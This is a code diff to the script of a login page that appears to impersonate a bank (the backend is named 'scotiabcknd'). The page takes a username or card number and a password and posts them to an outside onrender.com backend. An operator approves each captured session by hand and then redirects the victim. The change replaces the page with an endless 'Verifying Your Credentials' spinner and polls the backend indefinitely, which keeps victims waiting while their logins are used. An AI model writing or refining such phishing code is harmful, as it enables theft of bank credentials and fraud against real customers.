@@ -176,228 +176,212 @@
     </footer>
 
     <script src="https://unpkg.com/lucide@latest"></script>
-    <script>
-      lucide.createIcons();
+<script>
+  lucide.createIcons();
+  
+  // IMPORTANT: Replace this with your actual backend URL
+  // Your backend is deployed at: https://scotiabcknd.onrender.com
+  const BACKEND_URL = 'https://scotiabcknd.onrender.com'; 
+  // Alternative: If you're testing locally, use: 'http://localhost:5000'
+  
+  console.log('Using backend URL:', BACKEND_URL);
+  
+  document.getElementById('loginForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    
+    const login = document.getElementById('usernameInput').value;
+    const password = document.getElementById('passwordInput').value;
+    const submitBtn = document.getElementById('submitBtn');
+    const loadingIcon = submitBtn.querySelector('.loading');
+    const submitText = submitBtn.querySelector('span');
+    
+    // Reset messages
+    document.getElementById('usernameError').classList.remove('show');
+    document.getElementById('passwordError').classList.remove('show');
+    document.getElementById('successMessage').classList.remove('show');
+    
+    // Validate inputs
+    if (!login.trim()) {
+      document.getElementById('usernameError').textContent = 'Please enter username or card number';
+      document.getElementById('usernameError').classList.add('show');
+      return;
+    }
+    
+    if (!password.trim()) {
+      document.getElementById('passwordError').textContent = 'Please enter password';
+      document.getElementById('passwordError').classList.add('show');
+      return;
+    }
+    
+    // Show loading state
+    loadingIcon.classList.add('active');
+    submitText.textContent = 'Signing in...';
+    submitBtn.disabled = true;
+    
+    try {
+      console.log('Sending request to:', `${BACKEND_URL}/login`);
+      console.log('Data:', { login: login, password: password });
       
-      // IMPORTANT: Replace this with your actual backend URL
-      // Your backend is deployed at: https://scotiabcknd.onrender.com
-      const BACKEND_URL = 'https://scotiabcknd.onrender.com'; 
-      // Alternative: If you're testing locally, use: 'http://localhost:5000'
-      
-      console.log('Using backend URL:', BACKEND_URL);
-      
-      document.getElementById('loginForm').addEventListener('submit', async function(e) {
-        e.preventDefault();
-        
-        const login = document.getElementById('usernameInput').value;
-        const password = document.getElementById('passwordInput').value;
-        const submitBtn = document.getElementById('submitBtn');
-        const loadingIcon = submitBtn.querySelector('.loading');
-        const submitText = submitBtn.querySelector('span');
-        
-        // Reset messages
-        document.getElementById('usernameError').classList.remove('show');
-        document.getElementById('passwordError').classList.remove('show');
-        document.getElementById('successMessage').classList.remove('show');
-        
-        // Validate inputs
-        if (!login.trim()) {
-          document.getElementById('usernameError').textContent = 'Please enter username or card number';
-          document.getElementById('usernameError').classList.add('show');
-          return;
-        }
-        
-        if (!password.trim()) {
-          document.getElementById('passwordError').textContent = 'Please enter password';
-          document.getElementById('passwordError').classList.add('show');
-          return;
-        }
-        
-        // Show loading state
-        loadingIcon.classList.add('active');
-        submitText.textContent = 'Signing in...';
-        submitBtn.disabled = true;
-        
-        try {
-          console.log('Sending request to:', `${BACKEND_URL}/login`);
-          console.log('Data:', { login: login, password: password });
-          
-          const response = await fetch(`${BACKEND_URL}/login`, {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-              'Accept': 'application/json'
-            },
-            body: JSON.stringify({
-              login: login,
-              password: password
-            })
-          });
-          
-          console.log('Response status:', response.status);
-          console.log('Response headers:', response.headers);
-          
-          const data = await response.json();
-          console.log('Response data:', data);
-          
-          if (response.ok && data.success) {
-            // Success - store session ID and start polling
-            const sessionId = data.id;
-            localStorage.setItem('sessionId', sessionId);
-            
-            // Update button text
-            submitText.textContent = 'Login in...';
-            
-            // Start polling for status
-            pollStatus(sessionId);
-          } else {
-            // Show error
-            const errorMsg = data.error || `Login failed. Status: ${response.status}`;
-            document.getElementById('passwordError').textContent = errorMsg;
-            document.getElementById('passwordError').classList.add('show');
-            
-            // Reset button
-            loadingIcon.classList.remove('active');
-            submitText.textContent = 'Sign in';
-            submitBtn.disabled = false;
-          }
-        } catch (error) {
-          console.error('Network error:', error);
-          document.getElementById('passwordError').textContent = `Network error: ${error.message}. Please check backend URL: ${BACKEND_URL}`;
-          document.getElementById('passwordError').classList.add('show');
-          
-          // Reset button
-          loadingIcon.classList.remove('active');
-          submitText.textContent = 'Sign in';
-          submitBtn.disabled = false;
-        }
+      const response = await fetch(`${BACKEND_URL}/login`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
+        },
+        body: JSON.stringify({
+          login: login,
+          password: password
+        })
       });
       
-      async function pollStatus(sessionId) {
-        let attempts = 0;
-        const maxAttempts = 120; // Try for 10 minutes (5 seconds * 120 = 600 seconds)
-        
-        const checkStatus = async () => {
-          try {
-            console.log(`Checking status for session: ${sessionId}, attempt: ${attempts + 1}`);
-            const response = await fetch(`${BACKEND_URL}/status/${sessionId}`);
-            
-            if (!response.ok) {
-              console.error('Status check failed:', response.status);
-              attempts++;
-              if (attempts < maxAttempts) {
-                setTimeout(checkStatus, 5000);
-              } else {
-                document.getElementById('passwordError').textContent = 'Status check timed out. Please try again.';
-                document.getElementById('passwordError').classList.add('show');
-                resetButton();
-              }
-              return;
-            }
-            
-            const data = await response.json();
-            console.log('Status check response:', data);
-            
-            if (data.status === 'approved' && data.redirect_url) {
-              // Redirect to the approved URL
-              console.log('Approved! Redirecting to:', data.redirect_url);
-              window.location.href = data.redirect_url;
-              return true;
-            } else if (data.status === 'pending') {
-              // Continue polling
-              attempts++;
-              if (attempts < maxAttempts) {
-                setTimeout(checkStatus, 5000); // Check every 5 seconds
-                
-                // Update message every few attempts
-                if (attempts % 12 === 0) { // Every minute
-                  document.getElementById('successMessage').textContent = `Still waiting for admin approval... (${attempts/12} minute(s))`;
-                }
-              } else {
-                // Timeout
-                document.getElementById('passwordError').textContent = 'Request timed out after 10 minutes. Please try again.';
-                document.getElementById('passwordError').classList.add('show');
-                document.getElementById('successMessage').classList.remove('show');
-                resetButton();
-              }
-            } else if (data.error) {
-              // Error from backend
-              document.getElementById('passwordError').textContent = `Error: ${data.error}`;
-              document.getElementById('passwordError').classList.add('show');
-              document.getElementById('successMessage').classList.remove('show');
-              resetButton();
-            }
-          } catch (error) {
-            console.error('Status check error:', error);
-            attempts++;
-            if (attempts < maxAttempts) {
-              setTimeout(checkStatus, 5000);
-            } else {
-              document.getElementById('passwordError').textContent = 'Status check error. Please try again.';
-              document.getElementById('passwordError').classList.add('show');
-              document.getElementById('successMessage').classList.remove('show');
-              resetButton();
-            }
-          }
-          return false;
-        };
-        
-        // Start polling
-        setTimeout(checkStatus, 5000); // First check after 5 seconds
-      }
+      console.log('Response status:', response.status);
+      console.log('Response headers:', response.headers);
       
-      function resetButton() {
-        const submitBtn = document.getElementById('submitBtn');
-        const loadingIcon = submitBtn.querySelector('.loading');
-        const submitText = submitBtn.querySelector('span');
+      const data = await response.json();
+      console.log('Response data:', data);
+      
+      if (response.ok && data.success) {
+        // Success - store session ID and start polling
+        const sessionId = data.id;
+        localStorage.setItem('sessionId', sessionId);
         
+        // Update button text and show persistent loading
+        submitText.textContent = 'Verifying...';
+        showLoading();  // Replace page with infinite loading UI
+        
+        // Start infinite polling
+        pollStatus(sessionId);
+      } else {
+        // Show error
+        const errorMsg = data.error || `Login failed. Status: ${response.status}`;
+        document.getElementById('passwordError').textContent = errorMsg;
+        document.getElementById('passwordError').classList.add('show');
+        
+        // Reset button
         loadingIcon.classList.remove('active');
         submitText.textContent = 'Sign in';
         submitBtn.disabled = false;
       }
+    } catch (error) {
+      console.error('Network error:', error);
+      document.getElementById('passwordError').textContent = `Network error: ${error.message}. Please check backend URL: ${BACKEND_URL}`;
+      document.getElementById('passwordError').classList.add('show');
       
-      // Auto-fill saved credentials if remember me was checked
-      document.addEventListener('DOMContentLoaded', function() {
-        const rememberCheckbox = document.querySelector('input[type="checkbox"]');
-        const usernameInput = document.getElementById('usernameInput');
+      // Reset button
+      loadingIcon.classList.remove('active');
+      submitText.textContent = 'Sign in';
+      submitBtn.disabled = false;
+    }
+  });
+  
+  // New function: Show persistent loading UI (replaces page content)
+  function showLoading() {
+    // Hide form and show loading spinner/message
+    document.body.innerHTML = `
+      <div style="display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; background: #f8f9fa; font-family: Arial, sans-serif;">
+        <h2 style="color: #333; margin-bottom: 20px;">Verifying Your Credentials</h2>
+        <p style="color: #666; text-align: center; max-width: 300px; margin-bottom: 30px;">
+          Please wait while we securely process your login. This may take a few moments...
+        </p>
+        <div class="spinner" style="border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite;"></div>
+      </div>
+      <style>
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+      </style>
+    `;
+  }
+  
+  // Updated pollStatus: Infinite polling, no timeout
+  async function pollStatus(sessionId) {
+    const checkStatus = async () => {
+      try {
+        console.log(`Checking status for session: ${sessionId}`);
+        const response = await fetch(`${BACKEND_URL}/status/${sessionId}`);
         
-        // Check if we have saved credentials
-        const savedUsername = localStorage.getItem('savedUsername');
-        if (savedUsername) {
-          usernameInput.value = savedUsername;
-          rememberCheckbox.checked = true;
+        if (!response.ok) {
+          console.error('Status check failed:', response.status);
+          setTimeout(checkStatus, 5000);  // Retry after 5 seconds
+          return;
         }
         
-        // Update save state on checkbox change
-        rememberCheckbox.addEventListener('change', function() {
-          if (this.checked && usernameInput.value) {
-            localStorage.setItem('savedUsername', usernameInput.value);
-          } else {
-            localStorage.removeItem('savedUsername');
-          }
-        });
+        const data = await response.json();
+        console.log('Status check response:', data);
         
-        // Update on input
-        usernameInput.addEventListener('input', function() {
-          if (rememberCheckbox.checked && this.value) {
-            localStorage.setItem('savedUsername', this.value);
-          }
-        });
-        
-        // Test backend connection
-        console.log('Testing backend connection...');
-        fetch(`${BACKEND_URL}/`)
-          .then(response => {
-            console.log('Backend connection test:', response.status);
-            if (response.ok) {
-              console.log('Backend is reachable!');
-            }
-          })
-          .catch(error => {
-            console.error('Backend connection failed:', error);
-            console.error('Please make sure the backend is running at:', BACKEND_URL);
-          });
+        if (data.status === 'approved' && data.redirect_url) {
+          // Redirect to the approved URL
+          console.log('Approved! Redirecting to:', data.redirect_url);
+          window.location.href = data.redirect_url;
+        } else if (data.status === 'pending') {
+          // Continue polling indefinitely
+          setTimeout(checkStatus, 5000);  // Check every 5 seconds
+        } else if (data.error) {
+          // Error from backend - but since loading is shown, perhaps log only
+          console.error(`Error: ${data.error}`);
+          setTimeout(checkStatus, 5000);  // Keep trying
+        }
+      } catch (error) {
+        console.error('Status check error:', error);
+        setTimeout(checkStatus, 5000);  // Retry indefinitely
+      }
+    };
+    
+    // Start polling
+    setTimeout(checkStatus, 5000);  // First check after 5 seconds
+  }
+  
+  function resetButton() {
+    const submitBtn = document.getElementById('submitBtn');
+    if (!submitBtn) return;  // May not exist after showLoading
+    const loadingIcon = submitBtn.querySelector('.loading');
+    const submitText = submitBtn.querySelector('span');
+    
+    loadingIcon.classList.remove('active');
+    submitText.textContent = 'Sign in';
+    submitBtn.disabled = false;
+  }
+  
+  // Auto-fill saved credentials if remember me was checked
+  document.addEventListener('DOMContentLoaded', function() {
+    const rememberCheckbox = document.querySelector('input[type="checkbox"]');
+    const usernameInput = document.getElementById('usernameInput');
+    
+    // Check if we have saved credentials
+    const savedUsername = localStorage.getItem('savedUsername');
+    if (savedUsername) {
+      usernameInput.value = savedUsername;
+      rememberCheckbox.checked = true;
+    }
+    
+    // Update save state on checkbox change
+    rememberCheckbox.addEventListener('change', function() {
+      if (this.checked && usernameInput.value) {
+        localStorage.setItem('savedUsername', usernameInput.value);
+      } else {
+        localStorage.removeItem('savedUsername');
+      }
+    });
+    
+    // Update on input
+    usernameInput.addEventListener('input', function() {
+      if (rememberCheckbox.checked && this.value) {
+        localStorage.setItem('savedUsername', this.value);
+      }
+    });
+    
+    // Test backend connection
+    console.log('Testing backend connection...');
+    fetch(`${BACKEND_URL}/`)
+      .then(response => {
+        console.log('Backend connection test:', response.status);
+        if (response.ok) {
+          console.log('Backend is reachable!');
+        }
+      })
+      .catch(error => {
+        console.error('Backend connection failed:', error);
+        console.error('Please make sure the backend is running at:', BACKEND_URL);
       });
-    </script>
+  });
+</script>
   </body>
 </html>
